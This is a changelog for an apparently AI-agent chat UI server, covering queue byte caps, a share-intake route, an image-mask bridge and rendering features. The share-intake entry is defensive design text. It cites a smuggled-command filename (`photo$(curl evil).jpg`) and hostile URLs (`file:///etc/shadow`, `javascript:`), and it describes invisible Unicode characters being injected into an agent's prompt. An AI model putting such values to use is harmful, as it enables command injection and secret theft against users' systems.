  measured the wrong thing: a queue of five sentences and a queue of five
  four-image messages differ by roughly 50 MB, and only the second is a problem.
  Every queued entry is held in the host process (attachments still base64) until
  its turn runs.

  - **20 MiB warns, 50 MiB refuses.** Past the warn mark the message is still
    accepted and the `queued` status carries a `detail` note saying how much is
    parked; the server logs it too. Past the hard cap it is refused with
    `SESSION_QUEUE_FULL`, naming both the parked total and what the rejected
    message needed — an explicit error frame, never a silent drop.
  - **`MAX_SESSION_QUEUE` survives as a depth backstop, raised to 50.** Bytes do
    not bound count, and each entry becomes its own turn: ~500k one-line messages
    fit inside 50 MiB and would run a session for days.
  - `queuedFollowUpBytes` / `queuedBytes` (ui-server `ws/turns`) do the
    accounting, measuring the payload as it arrived on the wire.
  - The client stores the note per session (`queueNotes`) and the session drawer's
    Queued pill turns red and shows it on hover.

  Only affects backends without native follow-up — with `capabilities.followUp`
  (pi) messages go into the running turn and no host queue exists. The default
  Claude backend is the one that queues.

- 2be49b8: Stage an incoming system share on the server

  First phase of making the chat UI a share target on Android: `POST /api/share`
  accepts a multipart share (title, text, url, and up to ten files) and writes it
  to `<brain root>/.brain-ui/inbox/<id>/` alongside a `meta.json` manifest, so the
  agent can read, file and process it as an ordinary chat turn. Nothing enters the
  content repo until the agent decides where it belongs.

  Everything a share carries is attacker-influenced — file names come from
  whichever app invoked the share sheet — and the consumer is an agent with file
  and shell tools, which sets the bar for "sanitized": a name is not safe merely
  because the filesystem accepts it. The staging directory's name is minted
  server-side and no part of the payload is ever treated as a path. Names go
  through an ALLOWLIST — Unicode letters, digits, marks and `._-` — rather than a
  list of characters someone thought to forbid, because `photo$(curl evil).jpg`
  survives any such list and correct quoting by the agent is not a boundary.
  Format characters go too: bidi overrides, zero-width spaces and the Unicode tag
  block, from the text fields as well as the names, since all of them are quoted
  into a prompt and all of them are invisible to the human reading it. Names are
  bounded, given an extension from their media type when they have none, and
  de-duplicated rather than overwritten;
  `meta.json` is reserved — case-insensitively, since on macOS and Windows
  `META.JSON` and `meta.json` are one file — and the length bound counts UTF-8
  bytes rather than characters, because a filesystem component limit is a byte
  limit and a hundred CJK characters are three hundred bytes.

  Caps (`SHARE_MAX_FILES`, `SHARE_MAX_FILE_BYTES`, `SHARE_MAX_TOTAL_BYTES`,
  `SHARE_MAX_TEXT_BYTES`) are counted off the request stream rather than trusted
  from `content-length`, which HTTP/2 and chunked encoding omit entirely, then
  again against each part's claimed size and once more against the decoded bytes.
  A share is staged into `.<id>.partial` and renamed into place only once
  `meta.json` is written, so the agent cannot observe a half-written share even if
  the process is killed mid-write — which `try`/`catch` cleanup cannot cover. One
  unwritable file is recorded as `skipped` rather than losing the other four.

  Two fields that reach the agent are now validated rather than passed through: a
  `url` that is not http(s) is demoted to plain text, because the filing skill
  dereferences that field and `javascript:`, `data:` and `file:///etc/shadow` all
  arrive as plausible strings; and a media type that is not a media type becomes
  `application/octet-stream` instead of being quoted back into the prompt at
  whatever length the sender chose.

  `POST /api/share` also refuses a cross-site request. Every other state-changing
  route here reads JSON, which forces a preflight and is CSRF-safe by accident; a
  multipart POST is CORS-simple and gets no preflight, and under
  `AUTH_MODE=tailscale` the credential is the source IP, so no SameSite flag
  applies either. Concurrent intakes are capped, the inbox is capped at
  `SHARE_MAX_STAGED` shares, and the prune sweep is debounced instead of running
  on every upload. A failure mid-write removes the partial directory. Staged shares older than `SHARE_STAGING_TTL_MS`
  (7 days) are pruned opportunistically on each intake, and `pruneShareStaging()`
  is exported so a deployment can also sweep at boot.

  `template/.gitignore` now ignores `.brain-ui/`, which it never did — so a
  generated brain repo would have staged a share (and the keyterm and model
  caches) into git on the next `git add -A`.

  The route is mounted behind the auth guard, which is the whole defense for
  something that writes into the brain root — a wiring test now asserts it.

  A second, public route answers `POST /share-target` when no service worker was
  there to intercept it (evicted, storage cleared, or installed before the worker
  activated) with a redirect into the app instead of a bare 404 — the SPA fallback
  is GET-only, so without it the user gets a raw error page inside the app window.
  It reads no body and must stay outside the guard: a share navigation is
  cross-site, so the SameSite=Strict cookie is absent by construction.

  The service-worker share-target handler, the client intake, and the manifest
  entry in the deployment shell follow in later phases.

### Patch Changes

- Updated dependencies [2be49b8]
- Updated dependencies [2be49b8]
  - @schlessera/brain-ui-sdk@0.13.0
  - @schlessera/brain-backend-claude@0.13.0
  - @schlessera/brain-render-template@0.13.0

## 0.12.1

### Patch Changes

- @schlessera/brain-ui-sdk@0.12.1
- @schlessera/brain-backend-claude@0.12.1
- @schlessera/brain-render-template@0.12.1

## 0.12.0

### Patch Changes

- Updated dependencies [4281c59]
  - @schlessera/brain-ui-sdk@0.12.0
  - @schlessera/brain-backend-claude@0.12.0
  - @schlessera/brain-render-template@0.12.0

## 0.11.0

### Minor Changes

- 604abbc: Add a mask bridge: the reader paints the region an image edit applies to

  Masked inpainting needs someone to point at part of a picture, and there is no
  server-side substitute for that. This mirrors the existing location bridge: the
  agent calls `mcp__brain-ui__request_image_mask`, the browser opens a canvas over
  the image, and the painted PNG comes back over the socket.

  - **ui-sdk** — `mask_request` / `mask_response` / `mask_error` frames, validated
    at the boundary with the same decoded-byte budget as a chat image, plus
    `BackendBridge.requestMask`.
  - **ui-server** — pending-mask state on the turn coordinator, the bridge method,
    and inbound routing. Cancels reject the promise like every other pending
    interactive request, so a disconnect mid-paint fails the tool instead of
    hanging the turn.
  - **ui-react** — a `MaskEditor` modal: paint with a sized brush, undo, clear.
    Strokes are drawn on a capped working canvas and rescaled to the source
    image's true pixel dimensions on export, so a mask drawn on a phone lines up
    with a 4K original. Painted pixels export as fully transparent, which is the
    convention the edit endpoint reads.
  - **ui-backend-claude** — the tool, auto-allowed like the other bridge tools
    (the editor itself is the approval), and a system-prompt line telling the
    agent to ask rather than guess coordinates.

  The mask is written next to its image and the path returned, because what
  consumes it is `brain image --mask <path>`.

- cdfa039: Raise the preview, upload and share size limits to match the frame budget

  The socket already accepts ~12MB inbound (brain-ui sets `maxPayloadLength` to
  `MAX_CLIENT_FRAME_BYTES + 64KB`), but the limits layered above it were never
  lifted to use that headroom. Worst case today was 6MB decoded — about 8MB once
  base64 inflates it — against a 12MB frame.

  - `MAX_IMAGE_BYTES` 2MB → 4MB. This mostly governs GIFs: everything else is
    downscaled to 1568px and re-encoded to JPEG client-side, landing far below
    either number, while a GIF passes through untouched so its animation
    survives.
  - `MAX_TOTAL_IMAGE_BYTES` 6MB → 8MB, which is ~10.7MB base64 and still leaves
    the JSON envelope room inside the 12MB frame.
  - `FILE_SIZE_CAP_BYTES` 5MB → 10MB for the JSON preview path. Raw bytes
    (`?raw=1`) stream from disk and were never bounded by it, so this only ever
    affected text previews.
  - Render/share content 512KB → 4MB. That bound predated inlined assets: a
    shared document carries `data:` image URIs and pre-rendered mermaid SVGs,
    which pass 512KB without the prose being long. It is an HTTP body, not a
    socket frame.

  Left alone: `MAX_WS_MESSAGE_BYTES` (512KB, server → client). That one bounds
  what the browser renders and what reverse proxies will pass, which is a
  different risk than what the user can send.

### Patch Changes

- Updated dependencies [604abbc]
- Updated dependencies [cdfa039]
  - @schlessera/brain-ui-sdk@0.11.0
  - @schlessera/brain-backend-claude@0.11.0
  - @schlessera/brain-render-template@0.11.0

## 0.10.0

### Minor Changes

- 50f6ec7: Add `brain render` — documents to PDF, PNG, or standalone HTML from the CLI

  PDF generation existed in brain-kit already, but only over HTTP: the UI posted
  content to `/api/render`, which wrapped it in a document template and drove the
  headless Chrome in `@schlessera/brain-render-puppeteer`. Nothing on the command
  line could reach it, so agents and skills that wanted a shareable file shelled
  out to a browser themselves and re-invented the layout each time.

  - **New package `@schlessera/brain-render-template`** holds the markdown/HTML →
    print-ready document shell (marked plus the stylesheet), extracted from
    ui-server. Both callers now share it, so a page shared from the app and a PDF
    produced on the command line are byte-identical for identical input.
  - **New command `brain render <path|->`** with `--format pdf|png|html`. It
    strips frontmatter, takes the title from it, defaults the output path to the
    input with the format's extension, and refuses to write outside the brain
    root. `--format html` needs no browser at all.
  - **Remote images** stay blocked by default — the rendered page resolves no
    hostname, so a remote `<img>` becomes a visible `[alt — not embedded]`
    placeholder. The new repeatable `--allow-host` opens specific image hosts,
    passing the same allowlist to both the placeholdering and the renderer.
  - **New core skill `generate-pdf`** drives the command. It declares no `requires:`
    beyond `brain` itself.
  - `@schlessera/brain-render-puppeteer` becomes an optional peer of core, resolved
    dynamically like `@google/genai`: a missing renderer produces install
    instructions rather than a module-resolution stack trace.

  Also fixes a latent bug in the image placeholdering that ui-server shipped: the
  `<img>` match used `[^>]*` for attributes, so a `>` inside an earlier quoted
  attribute (`alt="<b>x</b>"`) truncated the match and let the remote image
  through unplaceholdered, to render as a broken-image box.

### Patch Changes

- Updated dependencies [50f6ec7]
  - @schlessera/brain-render-template@0.10.0
  - @schlessera/brain-ui-sdk@0.10.0
  - @schlessera/brain-backend-claude@0.10.0

## 0.9.0

### Minor Changes

- 1f7e6a3: Added: mermaid diagrams get their own share menu (PNG / PDF / SVG / source) and a
  full-screen pan-and-zoom viewer, opened by tapping the diagram.
  Added: a chat-surface brief appended to the agent's system prompt —
  `buildSystemPromptAppend({ client, tools })` — covering diagrams, `<share>`
  blocks, wikilinks, raw-HTML and tool-narration rules, the ask-user and location
  tools, and what the reader's device can do. Each backend declares its own tool
  names (pi has no location tool), and both take a `systemPromptAppend` option to
  override the whole brief.
  Added: `chat_message` frames carry an optional `client` field
  (`ClientEnvironment`: form factor, touch, standalone, camera, microphone,
  geolocation, share sheet, viewport, locale, timezone), feature-detected in the
  browser and validated strictly at the boundary. The Claude backend rebuilds its
  system-prompt append per turn from it.
  Changed: diagrams render in a theme built from the app's own tokens instead of
  mermaid's stock dark/neutral themes; exports use the matching light theme.
  Changed: `MermaidTheme` is now `"dark" | "light"` (was `"dark" | "neutral"`),
  `ShareMenu`'s `renderTrigger` also receives `status` and `icon`, and the
  server-internal `handleChatMessage` takes an options object.

### Patch Changes

- Updated dependencies [1f7e6a3]
  - @schlessera/brain-ui-sdk@0.9.0
  - @schlessera/brain-backend-claude@0.9.0

## 0.8.0

### Minor Changes

- 2868ba6: Mermaid diagram support across all render surfaces.

  - ` ```mermaid ` (and ` ```mmd `) fences render as diagrams in chat messages,
    the markdown file previewer, `<share>` block previews, Write-tool previews,
    and the "What's up" briefing — one hook in `BrainMarkdown`, so every surface
    gets it.
  - Streaming-safe: while a fence is still arriving the raw source shows as an
    ordinary code block; debounced parses (with a 400ms throttle floor) upgrade
    it to a diagram as soon as the source parses, and a failed parse keeps the
    last good SVG instead of flashing an error. Renders are cached, so per-token
    re-renders of a streaming message cost a lookup.
  - Mermaid (~2MB) loads lazily on first diagram; `securityLevel: "strict"` and
    `suppressErrorRendering` are set.
  - Share as PNG/PDF pre-renders fences to inline SVG on the client
    (`inlineMermaidDiagrams`, light "neutral" theme) before `POST /api/render`,
    since the render page runs without JavaScript or network. ui-server's share
    template gained matching `.mermaid-figure` styles.
  - Standalone `.mmd` / `.mermaid` files get a diagram preview (with the usual
    preview/raw toggle) in the file viewer.
  - `BrainMarkdown`'s component overrides are now identity-stable across
    renders, so streaming deltas no longer unmount/remount every code block.

### Patch Changes

- @schlessera/brain-ui-sdk@0.8.0
- @schlessera/brain-backend-claude@0.8.0

## 0.7.2

### Patch Changes

- @schlessera/brain-ui-sdk@0.7.2
- @schlessera/brain-backend-claude@0.7.2

## 0.7.1

### Patch Changes

- @schlessera/brain-ui-sdk@0.7.1
- @schlessera/brain-backend-claude@0.7.1

## 0.7.0

### Minor Changes

- b8cbf72: Knowledge-graph view: `brain graph` command and schema-v8 derived tables
  (metrics, communities, root distances, precomputed ForceAtlas2 layout) built
  at index time; `/api/graph/*` REST endpoints served from read-only brain.db
  access; a full-screen GraphPage with Clusters, Discovery, Local, and
  Maintenance modes rendered via a lazy-loaded sigma.js WebGL canvas.

### Patch Changes

- Updated dependencies [b8cbf72]
  - @schlessera/brain-ui-sdk@0.7.0
  - @schlessera/brain-backend-claude@0.7.0

## 0.6.3

### Patch Changes

- @schlessera/brain-ui-sdk@0.6.3
- @schlessera/brain-backend-claude@0.6.3

## 0.6.2

### Patch Changes

- Updated dependencies [eb0a6ba]
  - @schlessera/brain-backend-claude@0.6.2
  - @schlessera/brain-ui-sdk@0.6.2

## 0.6.1

### Patch Changes

- @schlessera/brain-ui-sdk@0.6.1
- @schlessera/brain-backend-claude@0.6.1

## 0.6.0

### Patch Changes

- @schlessera/brain-ui-sdk@0.6.0
- @schlessera/brain-backend-claude@0.6.0

## 0.5.1

### Patch Changes

- @schlessera/brain-ui-sdk@0.5.1
- @schlessera/brain-backend-claude@0.5.1

## 0.5.0

### Minor Changes

- 2904074: - Added: the model picker is discovered from the Anthropic Models API, so a new
  model appears without an env edit or a redeploy.
  - Added: a Settings screen (Models | Security) to hide models from the picker
    and refresh the list on demand.
  - Added: `BRAIN_UI_MODEL_DISCOVERY` and `BRAIN_UI_MODEL_TTL_HOURS`.
  - Changed: `BRAIN_UI_CLAUDE_PROFILES` is now only for non-Anthropic endpoints
    and for overriding a discovered model.
  - Changed: `useUIStore`'s `securityPanelOpen` / `toggleSecurityPanel` /
    `setSecurityPanelOpen` are now `settingsPanelOpen` / `toggleSettingsPanel` /
    `setSettingsPanelOpen`.

### Patch Changes

- Updated dependencies [2904074]
  - @schlessera/brain-backend-claude@0.5.0
  - @schlessera/brain-ui-sdk@0.5.0

## 0.4.0

### Minor Changes

- 2c42696: Extract the brain-ui deployment into two reusable packages.

  - **New `@schlessera/brain-ui-server`**: Hono app factory (`createApp`) with
    auth (password/passkeys/tailscale/proxy), the WebSocket turn coordinator
    (decomposed into explicit host objects: `WsHost`, `TurnCoordinator`,
    `SessionCatalog`), session catalog with bundled SQLite migrations, brain/
    files/voice routes, and injected seams for the static client build and the
    PNG/PDF renderer.
  - **New `@schlessera/brain-ui-react`**: the chat/files/voice React components,
    stores, and WS transport. The chat store now keeps a transcript buffer per
    session (plus a draft buffer), so background sessions accumulate instead of
    being discarded. Ships prebuilt JS + d.ts, a precompiled `styles.css`, and a
    `theme.css` source entry for Tailwind v4 consumers. Branding copy is
    configurable via `configureBrainUi()`.
  - **ui-sdk**: add `PasskeySummary` to the protocol (REST payload of the
    passkey management routes, previously local to brain-ui).

### Patch Changes

- Updated dependencies [2c42696]
  - @schlessera/brain-ui-sdk@1.0.0
  - @schlessera/brain-backend-claude@1.0.0
  - @schlessera/brain-backend-pi@1.0.0
